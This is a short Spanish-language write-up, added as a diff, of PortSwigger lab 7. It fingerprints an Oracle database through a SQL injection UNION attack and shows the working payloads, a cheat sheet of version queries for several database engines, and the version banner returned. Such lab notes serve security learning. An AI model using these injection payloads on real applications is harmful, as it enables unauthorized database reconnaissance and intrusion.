@@ -1,0 +1,39 @@
+>>>>>>portswigger
+>>>>lab 7
+>>SQL "union attack"
+
+Para resolver esta maquina es necesario saber que tipo de servidor SQL esta ocupando.
+
+al colocar "'union select null, null-- -" arroja un error de servidor.
+
+Se intentara por "oracle" en el cual la tabla "dual" siempre esta incluida (a demas en el titulo dice que es oracle)
+Cuando es un ataque a oracle, siempre es necesario especificar una tabla
+
+ >'union select null, null from dual-- -
+
+No presento error, asi que ese parece ser el camino
+
+Ahora para saber cual es la version utilizaremos el siguiente comando
+
+>'union select NULL,banner FROM v$version-- -
+
+ Para saber cual es la version de database tenemos los siguientes ejemplos recolectados de 
+https://portswigger.net/web-security/sql-injection/cheat-sheet
+
+Oracle		SELECT banner FROM v$version
+		SELECT version FROM v$instance
+
+Microsoft	SELECT @@version
+
+PostgreSQL	SELECT version()
+
+MySQL		SELECT @@version
+
+Con el aterior comando se pudo resolver el laboratorio.
+Se encontro la siguiente informacion
+
+CORE 11.2.0.2.0 Production
+NLSRTL Version 11.2.0.2.0 - Production
+Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
+PL/SQL Release 11.2.0.2.0 - Production
+TNS for Linux: Version 11.2.0.2.0 - Production
